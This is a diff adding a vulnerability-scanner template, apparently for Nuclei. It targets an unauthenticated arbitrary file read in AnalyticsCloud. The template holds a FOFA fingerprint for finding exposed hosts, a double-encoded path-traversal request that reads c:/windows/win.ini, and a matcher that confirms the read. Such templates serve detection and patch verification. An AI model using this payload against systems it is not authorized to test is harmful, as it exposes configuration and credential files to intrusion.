@@ -1,0 +1,35 @@
+id: AnalyticsCloud-fenxiyun-File-reading
+
+info:
+  name: AnalyticsCloud分析云任意文件读取漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="888607769"
+      该漏洞允许攻击者在未进行身份验证的情况下，通过构造特定请求读取目标系统中的任意文件。受影响的文件包括但不限于数据库配置文件、系统配置文件等敏感资源，可能导致敏感信息泄露，进而危及整个系统的安全性。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140655179
+  tags: AnalyticsCloud
+
+
+
+http:
+- raw:
+  - |
+    GET /.%252e/.%252e/c:/windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '; for 16-bit app support'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
